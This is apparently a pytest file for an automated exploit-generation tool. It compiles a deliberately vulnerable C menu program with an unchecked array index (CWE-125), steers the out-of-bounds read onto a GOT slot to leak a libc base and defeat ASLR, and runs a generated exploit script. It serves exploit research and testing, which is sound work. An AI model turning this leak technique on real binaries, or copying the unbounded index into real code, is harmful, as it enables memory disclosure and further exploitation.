"""CWE-125 out-of-bounds read -> information disclosure (doc 58).

The column that stopped at an ASan "out-of-bounds read" report: steer the read onto a GOT slot and
recover the disclosed libc address, so the exploit IS the disclosure (a libc base, ASLR defeated --
the very leak the ret2libc / FSOP chains consume). Forgery-proof: the disclosed value minus the
symbol's libc offset must be page aligned, which an echo or an in-bounds read cannot produce.

Builds a non-PIE menu whose read option indexes a global array with no bound check, steers the
index onto puts@got, and confirms a page-aligned libc base through the real driver + the shipped
reproducer. A libc leak works on any glibc, so this runs on the host.
"""
import shutil
import subprocess
import sys

import pytest

from lykos.analyze.poc import chain_primitive, rop
from lykos.analyze.dynamic import oob_index

# A non-PIE menu with an unchecked array index READ (CWE-125): option 1 prints arr[i] for any i.
_FIXTURE = r"""
#include <stdio.h>
#include <stdlib.h>
long arr[8] = {1, 2, 3, 4, 5, 6, 7, 8};
static long rdl(void){ char b[64]; if (!fgets(b, sizeof b, stdin)) exit(0); return strtol(b, 0, 10); }
int main(void){
    char cmd[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    puts("ready");                                  /* resolve puts@got */
    while (fgets(cmd, sizeof cmd, stdin)) {
        long c = strtol(cmd, 0, 10);
        if (c == 1) { long i = rdl(); printf("%ld\n", arr[i]); }   /* OOB read: no bound check */
        else if (c == 2) return 0;
    }
    return 0;
}
"""

_OPTS = ["1", "2"]
_MODEL = {"1": ["idx"], "2": []}


class _Ctx:
    def should_cancel(self):
        return False

    def progress(self, **kw):
        pass


def _build(tmp_path):
    src = tmp_path / "menu.c"
    src.write_text(_FIXTURE)
    exe = tmp_path / "menu"
    r = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0", "-w", "-o", str(exe),
                        str(src)], capture_output=True, text=True)
    if r.returncode != 0:
        pytest.skip(f"fixture build failed: {r.stderr[:200]}")
    exe.chmod(0o755)
    return exe


def _libc_for(exe):
    out = subprocess.check_output(["bash", "-c", f"ldd {exe} | awk '/libc/{{print $3}}'"]).decode().strip()
    return out, open(out, "rb").read()


def _plain_spawn(exe):
    return lambda: subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT)


@pytest.mark.skipif(not (shutil.which("gcc") and shutil.which("objdump")), reason="needs gcc + objdump")
def test_oob_read_discloses_libc_base(tmp_path):
    exe = _build(tmp_path)
    tb = exe.read_bytes()
    _, libc_data = _libc_for(exe)
    got = rop.got_entries(tb)
    syms = {n: o for n, o in rop.libc_symbols(libc_data, tuple(got)).items() if o}
    assert got and syms
    arrays = oob_index._array_candidates(__import__("lykos.analyze.poc.exploit", fromlist=["x"])
                                         .elf_objects_sized(tb))
    assert arrays, "the arr[] global was not found as an array candidate"

    hit = chain_primitive._oob_read_disclose(_Ctx(), _plain_spawn(exe), None, _OPTS, _MODEL,
                                             arrays, {n: got[n] for n in syms}, syms)
    assert hit is not None, "OOB read did not disclose a libc base"
    arr, read_opt, name, gaddr, idx, base = hit
    assert read_opt == "1" and name in syms
    assert idx < 0 or idx >= arr["cap"]                 # the disclosing index is OUT OF BOUNDS
    assert base > 0 and base % 0x1000 == 0              # a real, page-aligned libc base
    # Forgery-proof: the base resolves the symbol exactly.
    assert rop.resolve_libc_base(base + syms[name], syms[name]) == base


@pytest.mark.skipif(not (shutil.which("gcc") and shutil.which("objdump")), reason="needs gcc + objdump")
def test_oob_read_repro_script_discloses(tmp_path):
    exe = _build(tmp_path)
    tb = exe.read_bytes()
    _, libc_data = _libc_for(exe)
    got = rop.got_entries(tb)
    syms = {n: o for n, o in rop.libc_symbols(libc_data, tuple(got)).items() if o}
    arrays = oob_index._array_candidates(__import__("lykos.analyze.poc.exploit", fromlist=["x"])
                                         .elf_objects_sized(tb))
    hit = chain_primitive._oob_read_disclose(_Ctx(), _plain_spawn(exe), None, _OPTS, _MODEL,
                                             arrays, {n: got[n] for n in syms}, syms)
    assert hit, "no disclosure to reproduce"
    arr, read_opt, name, gaddr, idx, base = hit
    script = chain_primitive._oob_read_repro_script(read_opt, idx, name, syms[name])
    sp = tmp_path / "exploit.py"
    sp.write_bytes(script)
    r = subprocess.run([sys.executable, str(sp), str(exe)], capture_output=True, timeout=20)
    assert r.returncode == 0 and b"libc base" in r.stdout, f"repro failed: {r.stdout[-120:]!r}"
